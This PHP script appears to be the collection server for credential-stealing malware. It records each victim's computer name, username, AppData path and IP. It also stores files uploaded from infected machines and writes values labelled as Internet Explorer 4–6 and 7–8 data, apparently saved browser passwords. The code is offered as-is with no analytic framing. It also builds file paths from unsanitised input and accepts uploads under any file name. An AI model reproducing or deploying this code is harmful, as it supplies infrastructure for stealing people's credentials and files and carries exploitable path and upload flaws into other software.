<?php

$CN = $_GET['computername'];
$UN = $_GET['username'];
$APD = $_GET['appdata'];
$BASEDIR = "data/".$CN;


if ($_GET['action'] == "new") {
  if (!file_exists($BASEDIR)) { mkdir($BASEDIR, 0777, true); }

  $myfile = fopen($BASEDIR . "/info.txt", "w") or die("Unable to open file!");  
  fwrite($myfile, "COMPUTERNAME: $CN\n");
  fwrite($myfile, "IP: " . get_client_ip() . "\n");
  fwrite($myfile, "USERNAME: $UN\n");
  fwrite($myfile, "APPDATA: $APD\n");
  fclose($myfile);

} else if ($_GET['action'] == "upload") {
  move_uploaded_file($_FILES["uploadfile"]["tmp_name"], $BASEDIR . "/" . $_FILES["uploadfile"]["name"]);
#  file_put_contents("test.txt", $_FILES["uploadfile"]["tmp_name"]);
  

# IE 4 - 6    
} else if ($_GET['action'] == "ie46") {
  $myfile = fopen($BASEDIR . "/ie46.txt", "w") or die("Unable to open file!");
  fwrite($myfile, $_GET['val']. "\n");
  fclose($myfile);            

# IE 7 - 8 v1 
} else if ($_GET['action'] == "ie781") {
  $myfile = fopen($BASEDIR . "/ie781.txt", "w") or die("Unable to open file!");
  fwrite($myfile, $_GET['val']."\n");       
  fclose($myfile);
}
      

function get_client_ip() { 
     $ipaddress = '';
     if ($_SERVER['HTTP_CLIENT_IP']) {
       $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
     } else if($_SERVER['HTTP_X_FORWARDED_FOR']) {
       $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
     } else if($_SERVER['HTTP_X_FORWARDED']) {
       $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
     } else if($_SERVER['HTTP_FORWARDED_FOR']) {
       $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
     } else if($_SERVER['HTTP_FORWARDED']) {
       $ipaddress = $_SERVER['HTTP_FORWARDED'];
     } else if($_SERVER['REMOTE_ADDR']) {
       $ipaddress = $_SERVER['REMOTE_ADDR'];
     } else {
       $ipaddress = 'UNKNOWN';
     }   
     return $ipaddress;
}                                                                                                                 
                                                                                                                 


?>